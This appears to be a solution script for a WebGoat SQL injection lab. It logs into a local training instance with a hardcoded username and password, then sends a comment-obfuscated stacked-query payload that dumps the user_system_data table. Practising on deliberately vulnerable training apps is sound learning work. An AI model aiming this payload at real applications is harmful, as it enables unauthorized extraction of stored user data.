import requests
from requests import session

# Define the base URL and login URL
base_url = 'http://127.0.0.1:8080/WebGoat/'
login_url = f'{base_url}login'
vulnerable_url = f'{base_url}SqlInjectionAdvanced/attack6a'
session_url = f'{base_url}SqlInjectionAdvanced.lesson.lesson'

# Create a session to persist cookies across requests
with session() as s:
    # Retrieve the login page content
    response = s.get(login_url)
    
    # Define the user credentials
    username = 'sbombatkar'
    password = 'Sneha#1234'
    
    # Submit the login details to authenticate
    login_data = {
        'username': username,
        'password': password
    }
    response = s.post(login_url, data=login_data, allow_redirects=True)
    
    # Check if the login is successful
    if "Invalid username and password" not in response.text:
        print("Login successful!")
        
        # Access the lesson page to set up the attack
        lesson_page = s.get(session_url)
        
        # Create a payload for the SQL injection attack
        attack_data = {
            'userid_6a': "cyber';/**/select/**/*/**/from/**/user_system_data;--"
        }
        
        # Perform the SQL injection attack
        response = s.post(vulnerable_url, data=attack_data)
        
        # Check if the attack was successful
        response_data = response.json()
        if "lessonCompleted" in response_data and response_data["lessonCompleted"]:
            feedback = response_data["feedback"]
            output = response_data["output"]
            
            print(f"Feedback: {feedback}")
            print(f"Output: {output}")
        else:
            print("Attack failed.")
    else:
        print("Login failed. Please check your credentials and try again.")